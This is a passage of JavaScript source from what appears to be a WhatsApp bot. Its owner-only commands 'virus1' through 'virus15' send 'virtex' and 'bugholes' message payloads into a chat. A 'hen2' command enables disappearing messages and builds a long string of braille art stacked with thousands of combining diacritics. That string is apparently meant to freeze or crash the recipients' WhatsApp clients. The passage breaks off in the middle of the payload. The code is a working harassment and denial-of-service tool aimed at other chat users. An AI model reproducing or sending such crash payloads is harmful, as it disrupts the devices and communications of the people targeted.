@${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} `
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
break
case 'virus1':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, viruscatalog(prefix), text)
					break	
case 'virus2':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, katalogv3(prefix), text)
					break
case 'virus3':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, desk(prefix), text)
					break	
case 'virus4':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, bugholes(prefix), text)
					break	
case 'virus5':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, virtex6(prefix), text)
					break	
case 'virus6':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, viper2(prefix), text)
					break	
case 'virus7':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, katalog(prefix), text)
					break	
case 'virus8':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, virtex4(prefix), text)
					break	
case 'virus9':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, virtex5(prefix), text)
					break
case 'virus10':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, virtex(prefix), text)
					break	
case 'virus11':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, virtex(prefix), text)
					break			
case 'virus12':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, emoji3(prefix), text)
					break	
case 'virus13':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, viper4(prefix), text)
					break				
case 'virus14':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, viper2(prefix), text)
					break	
case 'virus15':
                    if (!dev.key.fromMe) return reply('Lu siapa')
					zoe.sendMessage(from, viper3(prefix), text)
					break		
					case 'hen2':
if (!dev.key.fromMe) return reply('Lu siapa')
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await zoe.toggleDisappearingMessages(from,`MODAR`,text)
lzain = ` ⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄ ⣧̼̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̀̈᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳ͅͅͅͅͅͅͅ‏⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤ ⣧̼̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̀̈᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳ͅͅͅͅͅͅͅ‏⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿ ‏⣧̼̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̀̈᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳ͅͅͅͅͅͅͅ⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⣧̼̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̀̈᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳ͅͅͅͅͅͅͅ⠄ ‏⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶ ⣧̼̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̀̈᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳ͅͅͅͅͅͅͅ‏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿ ̨𝅱𝅱𝅱𝅱𝅱𝅱𝅱𝅱𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̘̘̘̘̘͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̺̺̺̺̺͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈̮̮̮̮̮͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͆̍᪳᪳͌̽̽ࣨ̀ࣴ̀̀̀̀̀ࣴࣴࣴࣴ‏⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧̼̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̀̈᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳ͅͅͅͅͅͅͅ ‏⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿ ̨𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̘̘̘̘̘͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̺̺̺̺̺͈͈͈͈͈͈͈͈͈͈͈͈͈͆̍᪳᪳͌̽̽ࣨ